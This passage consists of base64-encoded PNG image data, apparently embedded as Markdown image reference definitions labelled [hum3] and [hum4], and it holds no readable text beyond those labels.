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

[hum3]:data:image/png;base64,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

[hum4]:data:image/png;base64,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